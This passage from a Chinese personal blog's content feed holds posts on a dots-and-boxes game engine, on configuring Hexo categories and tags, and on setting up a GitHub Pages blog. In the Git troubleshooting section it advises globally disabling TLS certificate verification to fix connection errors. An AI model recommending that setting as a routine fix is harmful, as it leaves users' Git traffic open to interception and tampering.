112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(37439.3,0)"><g data-mml-node="mi"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(485,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(846,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1422,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1888,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2339,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mi" transform="translate(3055,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3400,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(3869,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(42274.3,0) translate(0 250)"></g></g></g></g></svg></mjx-container></p><h3 id="点格棋代码实现"><a href="#点格棋代码实现" class="headerlink" title="点格棋代码实现"></a>点格棋代码实现</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p>这个函数是博弈引擎与平台进行通信交互的主函数，具体逻辑如下：</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-04-28_21-56-35.png" class=""><h4 id="主要行棋逻辑"><a href="#主要行棋逻辑" class="headerlink" title="主要行棋逻辑"></a>主要行棋逻辑</h4><p><code>MyMove()</code>函数主要是清理当前棋局，并产生走法，然后调用评估函数得到评分最大的走法</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-06-09_15-06-01.png" class=""><h4 id="评估函数"><a href="#评估函数" class="headerlink" title="评估函数"></a>评估函数</h4><p>主要使用极大极小搜索，以及使用α&amp;β剪枝算法剪枝</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-06-09_16-11-01.png" class="">]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>博弈论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo个人博客写文章以及Git报错解决</title>
    <link href="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>博客博客博客~~</p><span id="more"></span><h3 id="用Hexo写博客"><a href="#用Hexo写博客" class="headerlink" title="用Hexo写博客"></a>用Hexo写博客</h3><p>使用终端在命令行里创建一篇博客，然后会在目录<code>/source/_posts</code>下生成一个Markdown文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new post blog_name<br></code></pre></td></tr></table></figure><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-50-25.png" class=""><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-54-25.png" class=""><p>现在开始编辑</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>生成“分类”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">分类</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">categories</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加categories标签</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客写文章以及Git报错解决</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">Github个人博客搭建和使用</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>生成“标签”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标签</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-10 10:11:27</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">tags</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加tags标签</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: 个人博客写文章以及Git报错解决<br>date: 2023<span class="hljs-string">-08</span><span class="hljs-string">-10</span> 09:46:40<br>categories: Github个人博客搭建和使用<br><span class="hljs-keyword">tags:</span> [Github,博客搭建]<br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h3 id="git提交文章报错"><a href="#git提交文章报错" class="headerlink" title="git提交文章报错"></a>git提交文章报错</h3><h4 id="OpenSSL-SSL-read-Connection-was-reset-errno-10054"><a href="#OpenSSL-SSL-read-Connection-was-reset-errno-10054" class="headerlink" title="OpenSSL SSL_read: Connection was reset, errno 10054"></a>OpenSSL SSL_read: Connection was reset, errno 10054</h4><p>在文件里<code>git bash here</code>，设置后关闭当前terminal窗口，重新打开再执行git操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify "false" <br></code></pre></td></tr></table></figure><h4 id="Failed-to-connect-to-github-com-port-443-Operation-timed-out"><a href="#Failed-to-connect-to-github-com-port-443-Operation-timed-out" class="headerlink" title="Failed to connect to github.com port 443:Operation timed out"></a>Failed to connect to github.com port 443:Operation timed out</h4><p>​首先，你有全局的科学上网小猫猫，然后在git里执行更换代理即可，注意使用V2ray的默认端口是1080。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:7890 <br>git config --global https.proxy http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Github上搭建自己的个人博客</title>
    <link href="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>搭博客~~</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="Github账号"><a href="#Github账号" class="headerlink" title="Github账号"></a>Github账号</h4><p>需要有一个<code>GitHub</code>账号，没有的话到 <a href="https://github.com/">官网 </a>申请一个。</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>在自己电脑上安装好<code>Git</code>，<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>部署到<code>GitHub</code>时要用</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>官网下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" class=""><p>打开cmd窗口，执行命令 <code>node -v</code> 查看node版本</p><p>如果出现了系统找不到<code>node</code>，可以在系统环境变量中添加</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-05-14_12-21-48.jpg" class=""><p>在安装node的同时也安装了npm，执行 <code>npm -v</code> 查看npm版本</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808150618974.png" class=""><h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151116734.png" class="" title="image-20230808151116734"><p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151259633.png" class="" title="image-20230808151259633"><p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151342603.png" class="" title="image-20230808151342603"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151445824.png" class="" title="image-20230808151445824"><p>首先确定分支，然后重新打开设置GitHub Pages中找到我们主页的地址为 <a href="https://remixxyh.github.io/3xsh0re.github.io/">https://remixxyh.github.io/3xsh0re.github.io/</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808152113275.png" class="" title="image-20230808152113275"><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>我们采用<code>Hexo</code>来创建我们的博客网站，<code>Hexo</code> 是一个基于<code>NodeJS</code>的静态博客网站生成器，使用<code>Hexo</code>不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 <a href="https://hexo.io/zh-cn/">官网</a>。</p><p>安装 <code>Hexo</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo -v<br></code></pre></td></tr></table></figure><p>解决报错</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">hexo : 无法加载文件 <span class="hljs-name">C</span>:\Users\DELL\AppData\Roaming\npm\hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 <span class="hljs-name">https</span>:<br>/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170</span> 中的 about_Execution_Policies。<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>打开开发者选项</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155045188.png" class="" title="image-20230808155045188"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155116199.png" class="" title="image-20230808155116199"><p>成功解决</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155133450.png" alt="image-20230808155133450"></p><p>创建一个项目 <code>hexo-blog</code> 并初始化，踩雷，不能在盘根目录下创建，要建立二级目录才行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br>hexo g<br>hexo server<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160800840.png" class="" title="image-20230808160800840"><p>浏览器访问，默认路径<a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160847398.png" class="" title="image-20230808160847398"><h3 id="更换使用Fluid主题"><a href="#更换使用Fluid主题" class="headerlink" title="更换使用Fluid主题"></a>更换使用Fluid主题</h3><p>下载 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">最新 release 版本</a> 解压到 <code>themes</code> 目录，并将解压出的文件夹重命名为 <code>fluid</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808161347061.png" class="" title="image-20230808161347061"><p>如下修改 <code>Hexo</code> 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162045506.png" class="" title="image-20230808162045506"><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162106017.png" class="" 